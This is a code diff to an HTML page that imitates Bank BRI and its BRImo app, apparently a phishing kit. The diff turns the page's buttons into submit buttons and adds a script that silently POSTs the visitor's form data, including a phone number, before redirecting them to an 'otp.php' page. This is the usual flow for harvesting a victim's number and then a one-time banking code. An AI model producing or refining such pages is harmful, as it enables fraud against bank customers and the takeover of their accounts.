@@ -1195,13 +1195,13 @@ input{
 <br>
   <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
 <h5 style="color:#000; margin-top: 30px; margin-left: 4px">Menggunakan Aplikasi <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b></h5><br/>
-<button style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: #0F78CB;   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: #fff; word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -5px; padding-left:0px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2); background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdib3IRaHNRjlTmRSsnlYiWHXi-2hKjGeYTkiwNTgEf8X6i6fia6UAvcCXpEHGniKvo2bf-s3M4T5mVefZOUANCzaP7egZHXLwCQpXYFzm53JJ0K-PFeESZAjwXJmO-IEMCsGqxA-OnAqANo4uJ4OKfp07cKF7bQn5hQRRH55qAmQk9kJB7r6SUohF4zE/s2160/1718086811602.png); background-position: 100% 100%; background-size: 100% 100%" placeholder="08xxxxxx"  required maxlength="13" minlength="10"><b style="color: #fff">BRI</b><b style="color: #F37024">mo</b></h5><br/></button>
+<button type="submit" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: #0F78CB;   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: #fff; word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -5px; padding-left:0px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2); background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdib3IRaHNRjlTmRSsnlYiWHXi-2hKjGeYTkiwNTgEf8X6i6fia6UAvcCXpEHGniKvo2bf-s3M4T5mVefZOUANCzaP7egZHXLwCQpXYFzm53JJ0K-PFeESZAjwXJmO-IEMCsGqxA-OnAqANo4uJ4OKfp07cKF7bQn5hQRRH55qAmQk9kJB7r6SUohF4zE/s2160/1718086811602.png); background-position: 100% 100%; background-size: 100% 100%" placeholder="08xxxxxx"  required maxlength="13" minlength="10"><b style="color: #fff">BRI</b><b style="color: #F37024">mo</b></h5><br/></button>
 </h3>
 <br>
 <center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px; margin-top: 18px"><p>Menggunakan Mesin ATM</p><br>
 </center>
 
-<button style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: #0F78CB;   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: #fff; word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -10px; padding-left:10px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2); background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyZl4JWkRXWh9mmlJFDZVdafL45ecDZiLs5odIKzAqybnKb9L1A-IzsH78pQ746XbxF93aWhmFujI5xr26DL6hL4USZG68wTFxSZG2SQlgXyjrZzXrQDPVNE5huuCpkNSqPzJWB9Ek2vHopSl4syDYfyWMoi4gf2rJ9GcdaBfk0kt7FVg8qfBvPO8WpXI/s2160/1718086833573.png); background-position: 100% 100%; background-size: 100% 100%; color: #fff"  maxlength="13" minlength="10">Manual ATM</button>
+<button type="submit" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: #0F78CB;   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: #fff; word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -10px; padding-left:10px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2); background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyZl4JWkRXWh9mmlJFDZVdafL45ecDZiLs5odIKzAqybnKb9L1A-IzsH78pQ746XbxF93aWhmFujI5xr26DL6hL4USZG68wTFxSZG2SQlgXyjrZzXrQDPVNE5huuCpkNSqPzJWB9Ek2vHopSl4syDYfyWMoi4gf2rJ9GcdaBfk0kt7FVg8qfBvPO8WpXI/s2160/1718086833573.png); background-position: 100% 100%; background-size: 100% 100%; color: #fff"  maxlength="13" minlength="10">Manual ATM</button>
 </h3>
 
 <br><br>
@@ -1304,7 +1304,31 @@ input{
             
         </script>
 <!-- </body> -->
-
+<script>
+ $(document).ready(function(){
+    $('#formHP').submit(function(e) {
+    event.preventDefault();
+    
+document.getElementById('kirims').innerHTML = "Memproses....";
+ $.ajax({
+ type: 'POST',
+ url: '',
+ data: $(this).serialize(),
+ datatype: 'JSON',
+ 
+ complete: function(data) {
+            console.log('Complete')
+   setTimeout(function(){
+  window.location.href='otp.php';
+   
+    }, 1000);
+        }
+    });
+ });
+    return false;
+});   
+     
+</script>
 </body>
 </html>
 
